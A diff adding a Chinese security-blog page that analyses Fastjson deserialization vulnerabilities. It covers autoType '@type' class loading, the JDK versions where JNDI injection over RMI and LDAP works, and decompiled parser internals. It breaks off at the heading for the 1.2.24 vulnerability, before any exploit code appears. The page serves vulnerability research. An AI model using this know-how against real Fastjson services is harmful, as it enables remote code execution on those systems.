@@ -1,0 +1,1379 @@
+<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Fastjson反序列化漏洞研究 | Tyaoo's Blog</title><meta name="keywords" content="漏洞研究"><meta name="author" content="Tyaoo"><meta name="copyright" content="Tyaoo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="研究Fastjson各版本系列反序列化漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastjson反序列化漏洞研究">
+<meta property="og:url" content="https://tyaoo.github.io/2021/05/25/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/index.html">
+<meta property="og:site_name" content="Tyaoo&#39;s Blog">
+<meta property="og:description" content="研究Fastjson各版本系列反序列化漏洞">
+<meta property="og:locale">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<meta property="article:published_time" content="2021-05-24T17:14:57.000Z">
+<meta property="article:modified_time" content="2022-02-15T09:13:58.443Z">
+<meta property="article:author" content="Tyaoo">
+<meta property="article:tag" content="漏洞研究">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://tyaoo.github.io/2021/05/25/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Fastjson反序列化漏洞研究',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-02-15 17:13:58'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Tyaoo's Blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tyaoo's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Fastjson反序列化漏洞研究</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-05-24T17:14:57.000Z" title="Created 2021-05-25 01:14:57">2021-05-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-02-15T09:13:58.443Z" title="Updated 2022-02-15 17:13:58">2022-02-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Fastjson反序列化漏洞研究"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>研究Fastjson各版本系列反序列化漏洞</p>
+</blockquote>
+<span id="more"></span>
+
+<blockquote>
+<p>源码：<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a></p>
+</blockquote>
+<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><p>推荐在maven中配置，在pom.xml中添加 </p>
+<pre><code class="xml">&lt;dependencies&gt;
+    &lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
+        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
+        &lt;version&gt;1.2.24&lt;/version&gt;
+    &lt;/dependency&gt;
+&lt;/dependencies&gt;</code></pre>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>fastjson通过parse、parseObject处理以json结构传入的类的字符串形时，会默认调用该类的共有setter与构造函数，并在合适的触发条件下调用该类的getter方法</p>
+<p>当传入的类中setter、getter方法中存在利用点时，攻击者就可以通过传入可控的类的成员变量进行攻击利用</p>
+<p>在1.2.25之后的版本中，fastjson默认关闭了反序列化任意类的操作，即<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/enable_autotype">AutoType</a>，对应的是json字符串中<code>&quot;@type&quot;</code>对应的值</p>
+<p>JNDI注入可以利用RMI或者LDAP服务，高版本的jdk会限制这两个服务的开启，它们可利用的jdk版本如下：</p>
+<ul>
+<li>基于RMI的利用方式，适用jdk版本：<code>6u132</code>、<code>7u122</code>、 <code>8u113</code>之前</li>
+<li>基于LDAP的利用方式，适用jdk版本：<code>6u211</code>、<code>7u201</code>、<code>8u191</code>、<code>11.0.1</code>之前</li>
+</ul>
+<h3 id="反序列化操作"><a href="#反序列化操作" class="headerlink" title="反序列化操作"></a>反序列化操作</h3><p><strong>序列化</strong></p>
+<pre><code class="java">String text = JSON.toJSONString(obj); </code></pre>
+<p><strong>反序列化</strong></p>
+<pre><code class="java">// parse()会识别并调用目标类的setter方法及某些特定条件的getter方法
+TestClass obj = JSON.parse(&quot;&#123;json_str&#125;&quot;); // 返回JSONObject或JSONArray
+
+// parseObject() 等价于 parseObject() =&gt; JSON.toJSON(obj)
+// parseObject()会调用反序列化目标类的所有setter和getter方法
+TestClass obj = JSON.parseObject(&quot;&#123;json_str&#125;&quot;); // 只能返回JSONObject
+TestClass obj = JSON.parseObject(&quot;&#123;json_str&#125;&quot;, TestClass.class); // 返回TestClass类对象</code></pre>
+<h3 id="反序列化流程图"><a href="#反序列化流程图" class="headerlink" title="反序列化流程图"></a>反序列化流程图</h3><p>核心在于语法解析器</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105232211af82d694dfca10657691.png" alt="image-20210523011132183" style="zoom:80%;" />
+
+<h3 id="反序列化调用流程"><a href="#反序列化调用流程" class="headerlink" title="反序列化调用流程"></a>反序列化调用流程</h3><p>这里我把<code>parse()</code>函数作为例子，探究一下json字符串从反序列化开始后到对应属性的<code>set</code>方法的函数调用过程</p>
+<pre><code class="java">public abstract class JSON implements JSONStreamAware, JSONAware &#123;
+
+    public static Object parse(String text) &#123;
+        return parse(text, DEFAULT_PARSER_FEATURE); // 首先使用默认的feature进行反序列化
+    &#125;
+
+    public static Object parse(String text, int features) &#123;
+        if (text == null) &#123;
+            return null;
+        &#125; else &#123;
+            DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features); // 获取默认配置后调用DefaultJSONParser()获取一个DefaultJSONParser
+            Object value = parser.parse();
+            parser.handleResovleTask(value);
+            parser.close();
+            return value;
+        &#125;
+    &#125;</code></pre>
+<p><code>ParserConfig.getGlobalInstance()</code>返回的是配置的全局变量</p>
+<pre><code class="java">public class ParserConfig &#123;
+
+    public static ParserConfig getGlobalInstance() &#123;
+        return global; // 配置的全局变量
+    &#125;</code></pre>
+<p>紧接着调用<code>DefaultJSONParser()</code>函数返回一个Lexer，就是一个语法解析器</p>
+<pre><code class="java">public class DefaultJSONParser implements Closeable &#123;
+
+    public DefaultJSONParser(String input, ParserConfig config, int features) &#123;
+        this(input, new JSONScanner(input, features), config); // 初始化一个JSONLexer
+    &#125;
+
+    public DefaultJSONParser(Object input, JSONLexer lexer, ParserConfig config) &#123;
+        this.dateFormatPattern = JSON.DEFFAULT_DATE_FORMAT;
+        this.contextArrayIndex = 0;
+        this.resolveStatus = 0;
+        this.extraTypeProviders = null;
+        this.extraProcessors = null;
+        this.fieldTypeResolver = null;
+        this.lexer = lexer;
+        this.input = input;
+        this.config = config;
+        this.symbolTable = config.symbolTable;
+        int ch = lexer.getCurrent(); // 使用JSONLexer标记字符串中的&#39;&#123;&#39;和&#39;[&#39;
+        if (ch == &#39;&#123;&#39;) &#123;
+            lexer.next();
+            ((JSONLexerBase)lexer).token = 12;
+        &#125; else if (ch == &#39;[&#39;) &#123;
+            lexer.next();
+            ((JSONLexerBase)lexer).token = 14;
+        &#125; else &#123;
+            lexer.nextToken();
+        &#125;
+
+    &#125;</code></pre>
+<p>其中<code>JSONScanner()</code>函数是用来获取BOM信息的</p>
+<pre><code class="java">public final class JSONScanner extends JSONLexerBase &#123;
+
+    public JSONScanner(String input, int features) &#123;
+        super(features);
+        this.text = input;
+        this.len = this.text.length();
+        this.bp = -1;
+        this.next(); // 读字符串的BOM
+        if (this.ch == &#39;\ufeff&#39;) &#123;
+            this.next();
+        &#125;
+
+    &#125;</code></pre>
+<p>获取完Lexer之后我们就进入到<code>parser.parse()</code>函数</p>
+<pre><code class="java">public class DefaultJSONParser implements Closeable &#123;
+
+    public Object parse() &#123;
+        return this.parse((Object)null);
+    &#125;
+
+    public Object parse(Object fieldName) &#123;
+        JSONLexer lexer = this.lexer;
+        switch(lexer.token()) &#123; // 根据token
+        case 1:
+        case 5:
+        case 10:
+        case 11:
+        case 13:
+        case 15:
+        case 16:
+        case 17:
+        case 18:
+        case 19:
+        default:
+            throw new JSONException(&quot;syntax error, &quot; + lexer.info());
+        case 2:
+            Number intValue = lexer.integerValue();
+            lexer.nextToken();
+            return intValue;
+        case 3:
+            Object value = lexer.decimalValue(lexer.isEnabled(Feature.UseBigDecimal));
+            lexer.nextToken();
+            return value;
+        case 4:
+            String stringLiteral = lexer.stringVal();
+            lexer.nextToken(16);
+            if (lexer.isEnabled(Feature.AllowISO8601DateFormat)) &#123;
+                JSONScanner iso8601Lexer = new JSONScanner(stringLiteral);
+
+                try &#123;
+                    if (iso8601Lexer.scanISO8601DateIfMatch()) &#123;
+                        Date var11 = iso8601Lexer.getCalendar().getTime();
+                        return var11;
+                    &#125;
+                &#125; finally &#123;
+                    iso8601Lexer.close();
+                &#125;
+            &#125;
+
+            return stringLiteral;
+        case 6:
+            lexer.nextToken();
+            return Boolean.TRUE;
+        case 7:
+            lexer.nextToken();
+            return Boolean.FALSE;
+        case 8:
+            lexer.nextToken();
+            return null;
+        case 9:
+            lexer.nextToken(18);
+            if (lexer.token() != 18) &#123;
+                throw new JSONException(&quot;syntax error&quot;);
+            &#125;
+
+            lexer.nextToken(10);
+            this.accept(10);
+            long time = lexer.integerValue().longValue();
+            this.accept(2);
+            this.accept(11);
+            return new Date(time);
+        case 12: // 识别到JsonObject
+            JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));
+            return this.parseObject((Map)object, fieldName);
+        case 14: // 识别到JsonArray
+            JSONArray array = new JSONArray();
+            this.parseArray((Collection)array, (Object)fieldName);
+            if (lexer.isEnabled(Feature.UseObjectArray)) &#123;
+                return array.toArray();
+            &#125;
+
+            return array;
+        case 20:
+            if (lexer.isBlankInput()) &#123;
+                return null;
+            &#125;
+
+            throw new JSONException(&quot;unterminated json string, &quot; + lexer.info());
+        case 21:
+            lexer.nextToken();
+            HashSet&lt;Object&gt; set = new HashSet();
+            this.parseArray((Collection)set, (Object)fieldName);
+            return set;
+        case 22:
+            lexer.nextToken();
+            TreeSet&lt;Object&gt; treeSet = new TreeSet();
+            this.parseArray((Collection)treeSet, (Object)fieldName);
+            return treeSet;
+        case 23:
+            lexer.nextToken();
+            return null;
+        &#125;
+    &#125;</code></pre>
+<p>跟进<code>JSONObject()</code>函数设置map</p>
+<pre><code class="java">public class JSONObject extends JSON implements Map&lt;String, Object&gt;, Cloneable, Serializable, InvocationHandler &#123;
+
+    public JSONObject(int initialCapacity, boolean ordered) &#123;
+        if (ordered) &#123; // 根据ordered特征选择HashMap
+            this.map = new LinkedHashMap(initialCapacity);
+        &#125; else &#123;
+            this.map = new HashMap(initialCapacity);
+        &#125;
+
+    &#125;</code></pre>
+<p>下一步到调用最核心的<code>this.parseObject()</code>函数，整个函数都是在用Lexer提取出字符串中的键值和对应值，因为这个函数比较长，所以就不具体展示了，我们重点看判断<code>@type</code>字段的代码</p>
+<blockquote>
+<p>这里简单提一下lexer的相关操作，因为代码太长就不详细列出了：</p>
+<pre><code class="java">lexer.scanSymbol(this.symbolTable, &#39;&quot;&#39;); // 用来提取双引号包括的内容
+lexer.nextToken(16); // 转移到expect为16的case分支，根据当前的字符设置新的token，如果没有找到就会调用this.nextToken();
+lexer.nextToken(); // 根据当前的字符设置token</code></pre>
+</blockquote>
+<pre><code class="java">public class DefaultJSONParser implements Closeable &#123;
+
+    public final Object parseObject(Map object, Object fieldName) &#123;
+
+        ...
+
+        if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123; // JSON.DEFAULT_TYPE_KEY的值为@type
+            ref = lexer.scanSymbol(this.symbolTable, &#39;&quot;&#39;); // 获取@type对应的类名
+            Class&lt;?&gt; clazz = TypeUtils.loadClass(ref, this.config.getDefaultClassLoader()); // 使用loadCLass()加载对应类
+            if (clazz != null) &#123;
+                lexer.nextToken(16);
+                if (lexer.token() == 13) &#123;
+                    lexer.nextToken(16);
+
+                    try &#123;
+                        instance = null;
+                        ObjectDeserializer deserializer = this.config.getDeserializer(clazz);
+                        if (deserializer instanceof JavaBeanDeserializer) &#123;
+                            instance = ((JavaBeanDeserializer)deserializer).createInstance(this, clazz);
+                        &#125;
+
+                        if (instance == null) &#123;
+                            if (clazz == Cloneable.class) &#123;
+                                instance = new HashMap();
+                            &#125; else if (&quot;java.util.Collections$EmptyMap&quot;.equals(ref)) &#123;
+                                instance = Collections.emptyMap();
+                            &#125; else &#123;
+                                instance = clazz.newInstance();
+                            &#125;
+                        &#125;
+
+                        obj = instance;
+                        return obj;
+                    &#125; catch (Exception var23) &#123;
+                        throw new JSONException(&quot;create instance error&quot;, var23);
+                    &#125;
+                &#125;
+
+                this.setResolveStatus(2);
+                if (this.context != null &amp;&amp; !(fieldName instanceof Integer)) &#123;
+                    this.popContext();
+                &#125;
+
+                if (object.size() &gt; 0) &#123;
+                    instance = TypeUtils.cast(object, clazz, this.config);
+                    this.parseObject(instance);
+                    thisObj = instance;
+                    return thisObj;
+                &#125;
+
+                ObjectDeserializer deserializer = this.config.getDeserializer(clazz); // 获取反序列化解析器
+                thisObj = deserializer.deserialze(this, clazz, fieldName); // 进行反序列化
+                return thisObj;
+            &#125;
+
+            object.put(JSON.DEFAULT_TYPE_KEY, ref);
+        &#125;
+        ...</code></pre>
+<p>跟进<code>TypeUtils.loadClass()</code>函数，创建ClassLoader返回了对应类</p>
+<pre><code class="java">public class TypeUtils &#123;
+
+    public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;
+        if (className != null &amp;&amp; className.length() != 0) &#123;
+            Class&lt;?&gt; clazz = (Class)mappings.get(className); // 获取类名
+            if (clazz != null) &#123;
+                return clazz;
+            &#125; else if (className.charAt(0) == &#39;[&#39;) &#123; // 去掉&#39;[&#39;
+                Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);
+                return Array.newInstance(componentType, 0).getClass();
+            &#125; else if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123; // 去掉前面的&#39;L&#39;和后面&#39;;&#39;
+                String newClassName = className.substring(1, className.length() - 1);
+                return loadClass(newClassName, classLoader);
+            &#125; else &#123;
+                try &#123;
+                    if (classLoader != null) &#123; // 检查是否已有指定的classLoader
+                        clazz = classLoader.loadClass(className);
+                        mappings.put(className, clazz);
+                        return clazz;
+                    &#125;
+                &#125; catch (Throwable var6) &#123;
+                    var6.printStackTrace();
+                &#125;
+
+                try &#123;
+                    ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader(); // 从当前线程创建classLoader
+                    if (contextClassLoader != null) &#123;
+                        clazz = contextClassLoader.loadClass(className);
+                        mappings.put(className, clazz);
+                        return clazz;
+                    &#125;
+                &#125; catch (Throwable var5) &#123;
+                &#125;
+
+                try &#123;
+                    clazz = Class.forName(className);
+                    mappings.put(className, clazz);
+                    return clazz;
+                &#125; catch (Throwable var4) &#123;
+                    return clazz;
+                &#125;
+            &#125;
+        &#125; else &#123;
+            return null;
+        &#125;
+    &#125;</code></pre>
+<p>下一步进入到<code>getDeserializer()</code>函数，获取对应的反序列化器，这里返回的是<code>JavaBeanDeserializer</code></p>
+<pre><code class="java">public class ParserConfig &#123;
+
+    public ObjectDeserializer getDeserializer(Type type) &#123;
+        ObjectDeserializer derializer = (ObjectDeserializer)this.derializers.get(type);
+        if (derializer != null) &#123;
+            return derializer;
+        &#125; else if (type instanceof Class) &#123;
+            return this.getDeserializer((Class)type, type);
+        &#125; else if (type instanceof ParameterizedType) &#123;
+            Type rawType = ((ParameterizedType)type).getRawType();
+            return rawType instanceof Class ? this.getDeserializer((Class)rawType, type) : this.getDeserializer(rawType);
+        &#125; else &#123;
+            return JavaObjectDeserializer.instance;
+        &#125;
+    &#125;
+
+    public ObjectDeserializer getDeserializer(Class&lt;?&gt; clazz, Type type) &#123;
+        ...
+            for(int i = 0; i &lt; this.denyList.length; ++i) &#123; // 在中间的某一步会检查类名是否处在黑名单中，在1.2.24版本之前，denyList为[&quot;java.lang.Thread&quot;]
+                String deny = this.denyList[i];
+                if (className.startsWith(deny)) &#123;
+                    throw new JSONException(&quot;parser deny : &quot; + className);
+                &#125;
+            &#125;
+        ...</code></pre>
+<p>获取完对应的反序列化器后进可以进行反序列化了，跟进<code>deserialze()</code>函数</p>
+<pre><code class="java">public class JavaBeanDeserializer implements ObjectDeserializer &#123;
+
+    public &lt;T&gt; T deserialze(DefaultJSONParser parser, Type type, Object fieldName) &#123;
+        return this.deserialze(parser, type, fieldName, 0);
+    &#125;</code></pre>
+<p>上面一步会创建该类的实例<code>instance</code>然后传入到内部的<code>parseRest()</code>函数，进到更具体的<code>deserialze()</code>函数</p>
+<pre><code class="java">public class JavaBeanDeserializer implements ObjectDeserializer &#123;
+
+    protected Object parseRest(DefaultJSONParser parser, Type type, Object fieldName, Object instance, int features) &#123;
+        Object value = this.deserialze(parser, type, fieldName, instance, features);
+        return value;
+    &#125;
+</code></pre>
+<p>这一步的<code>deserialze()</code>函数因为太多也不具体展示了，主要是处理其对象成员，然后调用其<code>set</code>函数来给实例进行赋值，主要代码如下</p>
+<pre><code class="java">public class JavaBeanDeserializer implements ObjectDeserializer &#123;
+
+    protected &lt;T&gt; T deserialze(DefaultJSONParser parser, Type type, Object fieldName, Object object, int features) &#123;
+        ...
+        if (matchField) &#123; // 是否匹配到对象成员
+            if (!valueParsed) &#123;
+                fieldDeser.parseField(parser, object, type, fieldValues);
+            &#125; else &#123;
+                if (object == null) &#123;
+                    fieldValues.put(fieldInfo.name, fieldValue);
+                &#125; else if (fieldValue == null) &#123;
+                    if (fieldClass != Integer.TYPE &amp;&amp; fieldClass != Long.TYPE &amp;&amp; fieldClass != Float.TYPE &amp;&amp; fieldClass != Double.TYPE &amp;&amp; fieldClass != Boolean.TYPE) &#123;
+                        fieldDeser.setValue(object, fieldValue);
+                    &#125;
+                &#125; else &#123;
+                    fieldDeser.setValue(object, fieldValue); // 调用setValue()函数进行赋值
+                &#125;
+        ...</code></pre>
+<p>跟一下<code>setValue()</code>函数可以看到使用了<code>invoke()</code>调用了对应的<code>set</code>函数，发现<code>this.fieldInfo.method</code>其实在创建反序列化器的时候就已经被创建，所以我们移步回这个<code>this.config.getDeserializer(clazz)</code>函数的实现</p>
+<pre><code class="java">public abstract class FieldDeserializer &#123;
+
+    public void setValue(Object object, Object value) &#123;
+        if (value != null || !this.fieldInfo.fieldClass.isPrimitive()) &#123;
+            try &#123;
+                Method method = this.fieldInfo.method; // 获取对应的set函数
+                if (method != null) &#123;
+                    if (this.fieldInfo.getOnly) &#123;
+                        if (this.fieldInfo.fieldClass == AtomicInteger.class) &#123;
+                            AtomicInteger atomic = (AtomicInteger)method.invoke(object);
+                            if (atomic != null) &#123;
+                                atomic.set(((AtomicInteger)value).get());
+                            &#125;
+                        &#125; else if (this.fieldInfo.fieldClass == AtomicLong.class) &#123;
+                            AtomicLong atomic = (AtomicLong)method.invoke(object);
+                            if (atomic != null) &#123;
+                                atomic.set(((AtomicLong)value).get());
+                            &#125;
+                        &#125; else if (this.fieldInfo.fieldClass == AtomicBoolean.class) &#123;
+                            AtomicBoolean atomic = (AtomicBoolean)method.invoke(object);
+                            if (atomic != null) &#123;
+                                atomic.set(((AtomicBoolean)value).get());
+                            &#125;
+                        &#125; else if (Map.class.isAssignableFrom(method.getReturnType())) &#123;
+                            Map map = (Map)method.invoke(object);
+                            if (map != null) &#123;
+                                map.putAll((Map)value);
+                            &#125;
+                        &#125; else &#123;
+                            Collection collection = (Collection)method.invoke(object);
+                            if (collection != null) &#123;
+                                collection.addAll((Collection)value);
+                            &#125;
+                        &#125;
+                    &#125; else &#123;
+                        method.invoke(object, value); // 使用invoke()调用该set函数
+                    &#125;
+
+                &#125;</code></pre>
+<p>一直跟进到下面这行代码，我们需要创建一个<code>JavaBeanDeserializer</code>的反序列化器</p>
+<pre><code class="java">public class ParserConfig &#123;
+
+    public ObjectDeserializer getDeserializer(Class&lt;?&gt; clazz, Type type) &#123;
+        ...
+        derializer = this.createJavaBeanDeserializer(clazz, (Type)type);
+        ...</code></pre>
+<p>在<code>createJavaBeanDeserializer()</code>中对传入的类建立一个<code>beanInfo</code>，这个<code>beanInfo</code>包含了一个类的全部重要属性</p>
+<pre><code class="java">public class ParserConfig &#123;
+
+    public ObjectDeserializer createJavaBeanDeserializer(Class&lt;?&gt; clazz, Type type) &#123;
+        ...
+        beanInfo = JavaBeanInfo.build(clazz, type, this.propertyNamingStrategy);
+        ...</code></pre>
+<p>跟进<code>JavaBeanInfo.build()</code>函数的具体实现</p>
+<pre><code class="java">public class JavaBeanInfo &#123;
+
+    public static JavaBeanInfo build(Class&lt;?&gt; clazz, Type type, PropertyNamingStrategy propertyNamingStrategy) &#123;
+
+        ...
+
+        Method[] methods = clazz.getMethods(); // 获取该类的全部方法
+
+        ...
+
+        if (methodName.startsWith(&quot;set&quot;)) &#123; // 比例类的所有方法，如果找到了以&quot;set&quot;开头的方法
+            char c3 = methodName.charAt(3);
+            String propertyName;
+            if (!Character.isUpperCase(c3) &amp;&amp; c3 &lt;= 512) &#123;
+                if (c3 == &#39;_&#39;) &#123;
+                    propertyName = methodName.substring(4);
+                &#125; else if (c3 == &#39;f&#39;) &#123;
+                    propertyName = methodName.substring(3);
+                &#125; else &#123;
+                    if (methodName.length() &lt; 5 || !Character.isUpperCase(methodName.charAt(4))) &#123;
+                        continue;
+                    &#125;
+
+                    propertyName = TypeUtils.decapitalize(methodName.substring(3));
+                &#125;
+            &#125; else if (TypeUtils.compatibleWithJavaBean) &#123;
+                propertyName = TypeUtils.decapitalize(methodName.substring(3));
+            &#125; else &#123;
+                propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4); // 截取&quot;set&quot;之后的字符串并让首字母转为小写，即获取其属性名
+            &#125;
+
+            Field field = TypeUtils.getField(clazz, propertyName, declaredFields);
+            if (field == null &amp;&amp; types[0] == Boolean.TYPE) &#123; // 如果该属性不在声明成员中且为bool类型时
+                isFieldName = &quot;is&quot; + Character.toUpperCase(propertyName.charAt(0)) + propertyName.substring(1); // 转化为对应的&quot;is&quot;方法
+                field = TypeUtils.getField(clazz, isFieldName, declaredFields); // 检查其是否存在&quot;is&quot;方法
+            &#125;
+
+            JSONField fieldAnnotation = null;
+            if (field != null) &#123;
+                fieldAnnotation = (JSONField)field.getAnnotation(JSONField.class);
+                if (fieldAnnotation != null) &#123;
+                    if (!fieldAnnotation.deserialize()) &#123;
+                        continue;
+                    &#125;
+
+                    ordinal = fieldAnnotation.ordinal();
+                    serialzeFeatures = SerializerFeature.of(fieldAnnotation.serialzeFeatures());
+                    parserFeatures = Feature.of(fieldAnnotation.parseFeatures());
+                    if (fieldAnnotation.name().length() != 0) &#123;
+                        propertyName = fieldAnnotation.name();
+                        add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)null)); // 如果存在对应的&quot;set&quot;方法就会加入到域成员列表中
+                        continue;
+                    &#125;
+                &#125;
+            &#125;
+
+            if (propertyNamingStrategy != null) &#123;
+                propertyName = propertyNamingStrategy.translate(propertyName);
+            &#125;
+
+            add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)null)); // 最后把对应的属性名和&quot;set&quot;方法等相关信息加入到成员列表中
+        &#125;</code></pre>
+<p>那么关于json字符串从反序列化开始后到对应属性的<code>set</code>方法调用的分析就到此为止</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="1-2-24漏洞"><a href="#1-2-24漏洞" class="headerlink" title="1.2.24漏洞"></a>1.2.24漏洞</h3><p><strong>Exploit.java</strong></p>
+<blockquote>
